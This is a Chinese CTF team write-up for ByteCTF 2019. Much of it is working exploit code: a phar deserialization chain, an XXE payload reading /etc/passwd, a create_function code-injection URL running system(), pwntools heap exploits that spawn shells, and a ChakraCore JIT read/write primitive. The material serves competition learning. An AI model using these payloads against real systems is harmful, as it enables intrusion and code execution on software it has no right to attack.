---
title: ByteCTF 2019 SU Write Up
tags: ["ByteCTF"]
date: 2019-09-14 17:30:50
slug: "bytectf-2019-su-wu"
---

以下是我们 SU 本次 ByteCTF 的 writeup。

<!--more-->

##	Web

###	boring_code
买了一个`aaaasdbaidu.com`的域名，即可绕过前面的 url 限制。<del>没错有钱你就可以打 CTF</del>
然后在服务器上放`payload`就行了
```php
readfile(end(scandir(chr(microtime(chdir(next(scandir(chr(time())))))))));
```
dns 好了就直接爆破等时间就行了

###	EzCMS
竟然抄了一下我们 suctf 的题...
前面有一个 hash 长度拓展攻击，有原题，只不过长度为8位，hashdump跑一下就行了。
题目意图非常明显，跟 SUCTF upload labs 2 差不多，php phar 反序列化触发函数是`mime_content_type`，使用`php://filter/read=convert.base64-encode/resource=`绕过正则限制，加一个 `ZipArchive->open` 删除 `.htaccess`就行了
[Insomni'hack Teaser 2018比赛Write Up：File Vault题目](https://www.anquanke.com/post/id/95896)
然后随便上传一个 php 文件，删掉`.htaccess`之后就直接
构造 phar 的代码：
```php
<?php
class Check{
    public $filename;

    function __construct($filename)
    {
        $this->filename = $filename;
    }
}

class File{

    public $filename;
    public $filepath;
    public $checker;

}

class Admin{
    public $size;
    public $checker;
    public $file_tmp;
    public $filename;
    public $upload_dir;
    public $content_check;
}

class Profile{

    public $username = "/var/www/html/sandbox/9607fe6aa978f6811eb3fe830b544771/.htaccess";
    public $password = "9";
    public $admin;

}

class A{
    public $a = 1;
}

unlink("1.phar");

$phar = new Phar("1.phar"); //后缀名必须为phar
$phar->startBuffering();
// <?php __HALT_COMPILER();
$phar->setStub("GIF89a" . "<?php __HALT_COMPILER(); ?>"); //设置stub
$a = new ZipArchive();
$b = new Profile();
$b->admin = $a;
$o = new File();
$o->checker = $b;
$phar->setMetadata($o); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); 
    //签名自动计算
$phar->stopBuffering();
?>
```

###	rss
`http://122.112.199.14:80,baidu.com:80/file` 逗号绕过 `url_parse`，vps 上放 xml ，可以任意读
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" 
    xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>先知安全技术社区</title>
        <link>http://xz.aliyun.com/forum/</link>
        <description>先知安全技术社区</description>
        <atom:link href="http://xz.aliyun.com/forum/feed/" rel="self"></atom:link>
        <language>zh-hans</language>
        <lastBuildDate>Sun, 08 Sep 2019 10:15:41 +0800</lastBuildDate>
        <item>
            <title>&xxe;</title>
            <link>http://xz.aliyun.com/t/6223</link>
            <description>CVE-2018-14418 擦出新火花</description>
            <pubDate>Sun, 08 Sep 2019 10:15:41 +0800</pubDate>
            <guid>http://xz.aliyun.com/t/6223</guid>
        </item>
    </channel>
</rss>
```
php 伪协议读源码
index.php
```php
<?php
ini_set('display_errors',0);
ini_set('display_startup_erros',1);
error_reporting(E_ALL);
require_once('routes.php');

function __autoload($class_name){
    if(file_exists('./classes/'.$class_name.'.php')) {

        require_once './classes/'.$class_name.'.php';

    } else if(file_exists('./controllers/'.$class_name.'.php')) {

        require_once './controllers/'.$class_name.'.php';

    }
}
```

routes.php
```php
<?php

Route::set('index.php',function(){
    Index::createView('Index');
});

Route::set('index',function(){
    Index::createView('Index');
});

Route::set('fetch',function(){
    if(isset($_REQUEST['rss_url'])){
        Fetch::handleUrl($_REQUEST['rss_url']);
    }
});

Route::set('rss_in_order',function(){
    if(!isset($_REQUEST['rss_url']) && !isset($_REQUEST['order'])){
        Admin::createView('Admin');
    }else{
      if($_SERVER['REMOTE_ADDR'] == '127.0.0.1' || $_SERVER['REMOTE_ADDR'] == '::1'){
        Admin::sort($_REQUEST['rss_url'],$_REQUEST['order']);
      }else{
       echo ";(";
      }
    }
});
```

Admin.php
```php
<?php

class Admin extends Controller{
    public static function sort($url,$order){
        $rss=file_get_contents($url);
        $rss=simplexml_load_string($rss,'SimpleXMLElement', LIBXML_NOENT);
        require_once './views/Admin.php';
    }
}
```

Fetch.php
```php
<?php

class Fetch extends Controller{

    public static function handleUrl($url) {
        $r = parse_url($url);
        $invalidUrl = false;
	if (preg_match('/aliyun\.com$/', $r['host']) || preg_match('/baidu\.com$/', $r['host']) || preg_match('/qq\.com$/', $r['host'])) { 
            $rss = Rss::fetch($url);
        }else {
            $invalidUrl = true;
        }
        require_once './views/Fetch.php';
    }
}
```

Rss.php
```php
<?php

class Rss {

    public static function curl_request($url, $post = '', $cookie = '', $headers = '', $returnHeader = 0) {
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, $url);
        curl_setopt($curl, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)');
        curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($curl, CURLOPT_AUTOREFERER, 1);
        curl_setopt($curl, CURLOPT_REFERER, $url);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
        if ($post) {
            curl_setopt($curl, CURLOPT_POST, 1);
            curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($post));
        }
        if ($cookie) {
            curl_setopt($curl, CURLOPT_COOKIE, $cookie);
        }
        if ($headers) {
            curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
        }
        curl_setopt($curl, CURLOPT_HEADER, 1);
        curl_setopt($curl, CURLOPT_TIMEOUT, 5);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
        $data = curl_exec($curl);
        if (curl_errno($curl)) {
            return curl_error($curl);
        }
        curl_close($curl);
        list($header, $body) = explode("\r\n\r\n", $data, 2);
        $info['header'] = $header;
        $info['body'] = $body;
        return $info;
    }

    public static function fetch($url) {
        libxml_disable_entity_loader(false);
        $rss=file_get_contents($url);
        $rss=simplexml_load_string($rss,'SimpleXMLElement', LIBXML_NOENT);
        return $rss;
    }
}
```

View/Admin.php
```php
<?php
if($_SERVER['REMOTE_ADDR'] != '127.0.0.1'){
    die(';(');
}
?>
<?php include('package/header.php') ?>
<?php if(!$rss) {
    ?>
<div class="rss-head row">
    <h1>RSS解析失败</h1>
    <ul>
        <li>此网站RSS资源可能存在错误无法解析</li>
        <li>此网站RSS资源可能已经关闭</li>
        <li>此网站可能禁止PHP获取此内容</li>
        <li>可能由于来自本站的访问过多导致暂时访问限制Orz</li>
    </ul>
</div>
<?php
    exit;
};
function rss_sort_date($str){
    $time=strtotime($str);
    return date("Y年m月d日 H时i分",$time);
}
?>
<div>
<div class="rss-head row">
    <div class="col-sm-12 text-center">
        <h1><a href="<?php echo $rss->channel->link;?>" target="_blank"><?php echo $rss->channel->title;?></a></h1>
        <span style="font-size: 16px;font-style: italic;width:100%;"><?php echo $rss->channel->link;?></span>
        <p><?php echo $rss->channel->description;?></p>
        <?php

            if(isset($rss->channel->lastBuildDate)&&$rss->channel->lastBuildDate!=""){
                echo "<p> 最后更新:".rss_sort_date($rss->channel->lastBuildDate)."</p>";
            }
        ?>
    </div>
</div>
<div class="article-list" style="padding:10px">
    <?php 
    $data = [];
    foreach($rss->channel->item as $item){
        $data[] = $item;
    }
    usort($data, create_function('$a, $b', 'return strcmp($a->'.$order.',$b->'.$order.');'));
    foreach($data as $item){    
    ?>
        <article class="article">
            <h1><a href="<?php echo $item->link;?>" target="_blank"><?php echo $item->title;?></a></h1>
            <div class="content">
                <p>
                    <?php echo $item->description;?>
                </p>
            </div>
            <div class="article-info">
                <i style="margin:0px 5px"></i><?php echo rss_sort_date($item->pubDate);?>
                <i style="margin:0px 5px"></i>
                <?php
                    for($i=0;$i<count($item->category);$i++){
                        echo $item->category[$i];
                        if($i+1!=count($item->category)){
                            echo ",";
                        }
                    };
                    if(isset($item->author)&&$item->author!=""){
                ?>
                        <i class="fa fa-user" style="margin:0px 5px"></i>
                <?php
                        echo $item->author;
                    }
                ?>
            </div>
        </article>
    <?php }?>
</div>
<div class="text-center">
    免责声明:本站只提供RSS解析,解析内容与本站无关,版权归来源网站所有
</div>
</div>
</div>

<?php include('package/footer.php') ?>
```
可以看到`usort($data, create_function('$a, $b', 'return strcmp($a->'.$order.',$b->'.$order.');'));`，可以进行代码注入，
在xxe中构造`php://filter/convert.base64-encode/resource=http://127.0.0.1/rss_in_order?rss_url=http%3A%2F%2F122.112.199.14%2Fexample&order=id%2Cid)%3B%7D%3Bdie(system('ls%20-la%20%2F'))%3B%2F*`，直接用`system`执行列目录就行，在`/flag_eb8ba2eb07702e69963a7d6ab8669134`拿到 flag


##	Pwn
### note_five
unsortedbin attack and fastbin attack
```python
from pwn import*


e = ELF("./note_five")
a = e.libc
p = remote("112.126.103.195",9999)

def sl(x):
    p.sendline(x)

def create(idx,size):
    p.recvuntil(">> ")
    p.sl("1")
    p.recvuntil("idx: ")
    p.sl(str(idx))
    p.recvuntil("size: ")
    p.sl(str(size))


def remove(idx):
    p.recvuntil(">> ")
    p.sl("3")
    p.recvuntil("idx: ")
    p.sl(str(idx))


def edit(idx,content):
    p.recvuntil(">> ")
    p.sl("2")
    p.recvuntil("idx: ")
    p.sl(str(idx))
    p.recvuntil("content: ")
    p.sl(content)




create(0,0xe8)
create(1,0xe8)
create(2,0xe8)
create(3,0xe8)
create(4,0xe8)
remove(0)
edit(2,"b"*0xe0+p64(0x2d0)+"\xf0")
remove(3)
create(0,0x2d0 - 0x10)
edit(0,"b"*0xe0+p64(0)+p64(0xf1)+"c"*0xe0+p64(0)+p64(0xf1))
remove(1)
# overlap it
pay = 'b' * 0xe0
pay += p64(0) + p64(0xf1)
pay += p64(0) + p16(0x37f8 - 0x10)
edit(0,pay)

create(3,0xe8)

create(3,0xe8)

edit(0,"\x33"*0xe0+p64(0)+p64(0xf1)+"\x33"*0xe0+p64(0)+p64(0xf1))

remove(2)
edit(0,"\x33"*0xe0+p64(0)+p64(0xf1)+"\x33"*0xe0+p64(0)+p64(0xf1)+p16(0x25cf))

create(3,0xe8)
create(4,0xe8)
edit(4,"a"*9+p64(0)*7+p64(0xfbad1800)+p64(0)*3+p8(0))
p.recvuntil(p64(0xfbad1800))

p.recv(24)
libc_createress = u64(p.recv(6).ljust(8,"\x00"))-0x3c5600
# fastbin attack !!
pian = 0x7ffff7dd1b10 - 0x7ffff7dd196f
malloc_hook_one = a.symbols["__malloc_hook"]-pian+libc_createress
malloc_hook_two = a.symbols["__malloc_hook"]-0xc0+libc_createress
remove(3)
edit(0,"a"*0xe0+p64(0)+p64(0xf1)+"b"*0xe0+p64(0)+p64(0xf1)+p64(malloc_hook_one))

create(3,0xe8)
create(4,0xe8)
edit(4,"\x00"+p64(0)*4+p64(libc_createress+0x3c36e0)+p64(0)*22+p64(0xff))
remove(3)
edit(0,"\x33"*0xe0+p64(0)+p64(0xf1)+"\x33"*0xe0+p64(0)+p64(0xf1)+p64(malloc_hook_two))

create(3,0xe8)
create(4,0xe8)
edit(4,p64(0)*21 + p64(libc_createress+0x4526a)+ p64(a.symbols["__libc_realloc"]+13+libc_createress))
create(3,0xe0)
p.interactive()

```
### vip
利用随机数爆破fd 改指针使得可以edit 然后攻击list getshell。
```python
from pwn import*

#context.log_level = "debug"
#p = process("./vip")
e = ELF("./vip")
a = ELF("./libc-2.27.so")
p = remote("112.126.103.14",9999)
#gdb.attach(p)
def sl(x):
    p.sendline(x)
def rl(x):
    p.recvunitl(x)
def create(idx):
    p.rl("Your choice: ")
    p.sl("1")
    p.rl("Index: ")
    p.sl(str(idx))


def remove(idx):
    p.rl("Your choice: ")
    p.sl("3")
    p.rl("Index: ")
    p.sl(str(idx))

def modify(idx,size):
    p.rl("Your choice: ")
    p.sl("4")
    p.rl("Index: ")
    p.sl(str(idx))
    p.rl("Size: ")
    p.sl(str(size))
def edit(idx,size,content):
    p.rl("Your choice: ")
    p.sl("4")
    p.rl("Index: ")
    p.sl(str(idx))
    p.rl("Size: ")
    p.sl(str(size))
    p.rl("Content: ")
    p.send(content)
def show(idx):
    p.rl("Your choice: ")
    p.sl("2")
    p.rl("Index: ")
    p.sl(str(idx))

create(0)
create(1)
remove(1)


while 1:
    modify(0,0x63)
    show(0)
    things = p.rl("\n",drop=True)
    if len(things) >= 0x63 :
        byte = u8(things[-1:])
        if byte == 0x40:
            print "waitting :"+str(hex(byte))
            break
        else:
            continue
    else:
        continue
while 1:
    modify(0,0x62)
    show(0)
    things = p.rl("\n",drop=True)
    if len(things) >= 0x62 :
        byte = u8(things[-2:-1])
        if byte == 0x40:
            print "waitting :"+str(hex(byte))
            break
        else:
            continue
    else:
        continue
while 1:
    modify(0,0x61)
    show(0)
    things = p.rl("\n",drop=True)
    if len(things) >= 0x61 :
        byte = u8(things[-3:-2])
        if byte == 0xd0:
            print "Get it : "+str(hex(byte))
            break
        else:
            continue
    else:
        continue

# you can attack it
create(3)
create(4)
edit(4,0x40,p64(0xdeadbeef)*2+p64(0x404070)*5+"\n")
# edit success!!
edit(4,0x50,p64(0xdeadbeef)*2+p64(0x404070)*7+"\n")

show(0)
libc_creater = u64(p.rl("\n",drop=True).ljust(8,"\x00")) - a.symbols["atoi"]
system = libc_creater + a.symbols["system"]
# use the pointer to get it.
edit(0,0x10,p64(system)*2)

p.rl("Your choice: ")
p.send("/bin/sh\x00"+"\n")

p.interactive()
```
### mheap
read 的时候会出错向上写单链表指针控制list
```python
from pwn import*

context.log_level = "debug"
#p = process("./mheap")

p = remote("112.126.98.5",9999)

def sl(x):
    p.sendline(x)
def rl(x):
    p.recvuntil(x)
def create(idx,size,content):
    p.rl("Your choice: ")
    p.sl("1")
    p.rl("Index: ")
    p.sl(str(idx))
    p.rl("Input size: ")
    p.sl(str(size))
    p.rl("Content: ")
    p.send(str(content))

def remove(idx):
    p.rl("Your choice: ")
    p.sl("3")
    p.rl("Index: ")
    p.sl(str(idx))

def modify(idx,content):
    p.rl("Your choice: ")
    p.sl("4")
    p.rl("Index: ")
    p.sl(str(idx))
    p.sl(content)
def show(idx):
    p.rl("Your choice: ")
    p.sl("2")
    p.rl("Index: ")
    p.sl(str(idx))

create(0,3840+0x10,"\n")
create(1,80,"a"*80)
remove(1)

create(2,256,p64(0x60)+p64(0x4040e0)+"\x22"*(0xd0-1)+"\n")

create(1,80,"a"+"\n")

create(2,0x23330000,p64(0x404050)+"\n")
show(2)
libc_creater = u64(p.rl("\n",drop=True).ljust(8,"\x00"))-0x40680
system = 0x4f440+libc_creater
modify(2,p64(system))

p.rl("choice: ")
p.sl("/bin/sh\x00")
p.interactive()
```
### mulnote
```python=
from pwn import *
context.arch = "amd64"
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
def c(size,data):
	io.sendlineafter(">",'C')
	io.sendlineafter(">",str(size))
	io.sendlineafter(">",data)
def r(idx):
	io.sendlineafter(">",'R')
	io.sendlineafter(">",str(idx))
def e(idx,data):
	io.sendlineafter(">",'E')
	io.sendlineafter(">",str(idx))
	io.sendafter(">",data)
def s():
	io.sendlineafter(">",'S')
#io = process("./mulnote")
io = remote('112.126.101.96',9999)
c(0x100,'AAAA')
r(0)
s()
io.recvuntil('[0]:\n')
lbase = u64(io.recv(6).ljust(8,'\x00'))-0x3c4b78
success(hex(lbase))
c(0x60,'tcl')
c(0x60,'tcl')
c(0x60,'tcl')
r(1)
r(2)
r(1)
c(0x60,p64(lbase+libc.sym['__malloc_hook']-0x23))
c(0x60,p64(lbase+libc.sym['__malloc_hook']-0x23))
c(0x60,p64(lbase+libc.sym['__malloc_hook']-0x23))
c(0x60,'a'*0x13+p64(lbase+0x4526a))

#gdb.attach(io)
io.interactive()

```
### childjs
[PoC和解析](https://bugs.chromium.org/p/project-zero/issues/detail?id=1702)
真·面向CVE做题

任意地址读
```javascript=
function opt(o, proto, value) {
    o.b = 1;

    let tmp = {__proto__: proto};

    o.a = value;
}

function main() {
    for (let i = 0; i < 2000; i++) {
        let o = {a: 1, b: 2};
        opt(o, {}, {});
    }

    let o = {a: 1, b: 2};

    opt(o, o, 0x1234);

    print(o.a);
}

main();
```
任意地址写
```javascript=
obj = {}
obj.a = 1;
obj.b = 2;
obj.c = 3;
obj.d = 4;
obj.e = 5;
obj.f = 6;
obj.g = 7;
obj.h = 8;
obj.i = 9;
obj.j = 10;

dv1 = new DataView(new ArrayBuffer(0x100));
dv2 = new DataView(new ArrayBuffer(0x100));

BASE = 0x100000000;

function hex(x) {
    return "0x" + x.toString(16);
}

function opt(o, c, value) {
    o.b = 1;

    class A extends c {}
    let tmp = {__proto__: proto};

    o.a = value;
}

function main() {
    for (let i = 0; i < 2000; i++) {
        let o = {a: 1, b: 2};
        opt(o, (function () {}), {});
    }

    let o = {a: 1, b: 2};
    let cons = function () {};

    cons.prototype = o;

    opt(o, o, obj); // o->auxSlots = obj (Step 1)

    o.c = dv1; // obj->auxSlots = dv1 (Step 2)

    obj.h = dv2; // dv1->buffer = dv2 (Step 3)

    let read64 = function(addr_lo, addr_hi) {
        // dv2->buffer = addr (Step 4)
        dv1.setUint32(0x38, addr_lo, true);
        dv1.setUint32(0x3C, addr_hi, true);

        // read from addr (Step 5)
        return dv2.getInt32(0, true) + dv2.getInt32(4, true) * BASE;
    }

    let write64 = function(addr_lo, addr_hi, value_lo, value_hi) {
        // dv2->buffer = addr (Step 4)
        dv1.setUint32(0x38, addr_lo, true);
        dv1.setUint32(0x3C, addr_hi, true);

        // write to addr (Step 5)
        dv2.setInt32(0, value_lo, true);
        dv2.setInt32(0, value_hi, true);
    }

    // get dv2 vtable pointer
    vtable_lo = dv1.getUint32(0, true);
    vtable_hi = dv1.getUint32(4, true);
    print(hex(vtable_lo + vtable_hi * BASE));

    // read first vtable entry using the RW primitive
    print(hex(read64(vtable_lo, vtable_hi)));

    // write a value to address 0x1111111122222222 using the RW primitive (this will crash)
    write64(0x22222222, 0x11111111, 0x1337, 0x1337);
}

main();
```
用这个安全客的脚本修改一下libChakraCore的got表就完事儿了，NX没开，got中的`resolve`指向bss，跑个shellcode，搞定

##	Misc
### jigsaw
纯拼图，按照时间排下序完事了
``` python
# coding=utf-8
import os
from PIL import Image

path = "./pics/"
def get_file_list(file_path):
    dir_list = os.listdir(file_path)
    if not dir_list:
        return
    else:
        dir_list = sorted(dir_list,  key=lambda x: os.path.getmtime(os.path.join(file_path, x)))
        # print(dir_list)
        return dir_list
list_im = get_file_list(path)
column = 21
row_num = 11
width = 35
height = 43
imgs = [Image.open(path+i) for i in list_im]
target = Image.new('RGB', (width*column, height*row_num))
for i in range(len(list_im)):
    if i % column == 0:
        end = len(list_im) if i + column > len(list_im) else i + column 
        for col, image in enumerate(imgs[i:i+column]):
            target.paste(image, (width*col, height*(i//column), 
                                 width*(col + 1), height*(i//column + 1)))   
target.show()
```
拿到flag ![](https://hackmd.summershrimp.com/uploads/upload_f47c3d040ed16a129a345190d1caa97d.png)


###	betgame
```python
from pwn import *
import random
import time
context.log_level = 'DEBUG'
io = remote('112.125.25.81',9999)
#lis = {'j':'s','b':'j','s':'b'}
lis1 = {'j':'b','b':'s','s':'j'}
lis2 = {'j':'s','b':'j','s':'b'}
win = 0
step = 0

def sjb():
	rec = io.recvline()[-2]
	io.sendline(rec)
	msg = io.recvline()
	if 'you win' in msg:
		print('win')
	now = lis1
	rec = io.recvline()[-2]
	io.sendline(now[rec])
	msg = io.recvline()
	if 'you win' in msg:
		print('win')
	now = lis2
	rec = io.recvline()[-2]
	io.sendline(now[rec])
	msg = io.recvline()
	if 'you win' in msg:
		print('win')

while True:
	sjb()
```

##	Crypto

### lrlr
大致思路就是伪随机预测+rsa的低指数广播攻击

MTRecover得到了所有的key
```python
import random
from MTRecover import MT19937Recover

with open('old','r') as f:
    bits = f.read().split("\n")[:-1]

dis = []

for _ in bits:
    dis.append(int(_))

mtb = MT19937Recover()
rand = mtb.go(dis)
for i in range(72):
	next_rand = rand.getrandbits(128)
	print next_rand
```

根据key解密aes

```python
from Crypto.Util.number import getPrime, bytes_to_long, long_to_bytes
from Crypto.Cipher import AES

def stateconvert(key,text):
    key = long_to_bytes(key)
    handle = AES.new(key, AES.MODE_CBC, "\x00"*16)
    output = handle.decrypt(text)
    return output


with open("new","r") as f:
	new = f.read().split("\n")[:-1]

with open("key","r") as f:
	key = f.read().split("\n")[:-1]

tmp1 = []

for i in range(24):
	tmp1.append(bytes_to_long(stateconvert(int(key[len(key)+i-24]),new[i].decode("hex"))))

tmp2 = []

for i in range(24):
	tmp2.append(bytes_to_long(stateconvert(int(key[len(key)+i-48]),long_to_bytes(tmp1[i]))))

s = ""
f = open("clist","wb")
for i in tmp2:
	s += str(i).replace("L","")+'\n'
f.write(s)

```
rsa低指数广播攻击

```python
# -*- coding: cp936 -*-
import gmpy2
import time
def CRT(items):
    N = reduce(lambda x, y: x * y, (i[1] for i in items))
    result = 0
    for a, n in items:
        m = N / n
        d, r, s = gmpy2.gcdext(n, m)
        if d != 1: raise Exception("Input not pairwise co-prime")
        result += a * s * m
    return result % N, N
# 读入 e, n, c
e = 17
with open("clist") as f:
	clist = f.read().split('\n')[:-1]
with open("cl") as f:
	cl = f.read().replace('L','').split('\n')[:-1]
c = []
for i in clist:
	c.append(int(i))
n = []
for i in cl:
	n.append(int(i,16))


print '[+]Detecting m...'
data = zip(c, n)
x, n = CRT(data)
realnum = gmpy2.iroot(gmpy2.mpz(x), e)[0].digits()
print '  [-]m is: ' + '{:x}'.format(int(realnum))
print '[!]All Done!'
```


rsa也出了，然后最后一步逆种子Orz
init_state = 0x87c303deaa0880e30957a1c3886a86f100c3a67381d022cd00ab8b3b028bd87c
```python
from Crypto.Util.number import bytes_to_long, long_to_bytes
def generate_init_state(seed):
    a = 0
    # print bin(seed)[2:]
    for i in bin(seed)[2:]:
        a = a << 1
        if (int(i)):
            a = a ^ seed
        if a >> 256:
            a = a ^ 0x10000000000000000000000000000000000000000000000000000000000000223L
    return a

result = 0x87c303deaa0880e30957a1c3886a86f100c3a67381d022cd00ab8b3b028bd87c
for i in range(1000000):
    result = generate_init_state(result)
    if long_to_bytes(result)[-1] == '}':
    	print long_to_bytes(result)
```

根据异或性质直接爆回去
![](https://hackmd.summershrimp.com/uploads/upload_e098d7bf802d700acd98ac57755507e7.png)

坑点在于flag格式 爆了半天bytectf